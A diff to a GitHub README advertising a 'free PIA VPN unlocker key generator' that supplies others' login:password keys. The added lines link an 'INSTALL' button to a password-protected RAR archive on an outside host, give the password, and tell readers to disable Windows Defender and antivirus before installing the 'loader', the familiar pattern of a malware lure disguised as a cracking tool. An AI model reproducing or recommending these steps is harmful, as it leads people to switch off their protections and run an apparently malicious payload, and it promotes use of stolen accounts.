@@ -2,9 +2,15 @@
 
 ![PIA1](https://github.com/BeastJJ/free-PIA-VPN-unlocker-key-generator-utility/assets/155189688/d3858398-f183-4d9d-a546-06854d0cb97e)
 
-# 🖥️[𝐈𝐍𝐒𝐓𝐀𝐋𝐋]()
+# 🖥️[𝐈𝐍𝐒𝐓𝐀𝐋𝐋](https://boogi.ma/temp/GitLauncher.rar)
 
 # 🔐 𝐏𝐀𝐒𝐒: 2024
+
+🟩If you can’t install utility, you need to:
+
+🟩Disable Windows DEF/AV
+
+🟩Download WinRar on your computer.
 
 # 📌Description
 
@@ -14,3 +20,7 @@ You can download PIA VPN for free, but you won't be able to use it without an ac
 ***This utility allows you to use the original PIA VPN without paying for a subscription. 
 The program will select the keys for you to log into the PIA VPN. The format key is login:password. 
 We are refining the utility and making it better with each update.***
+
+# ⚙️How to download
+
+* Download file and install loader
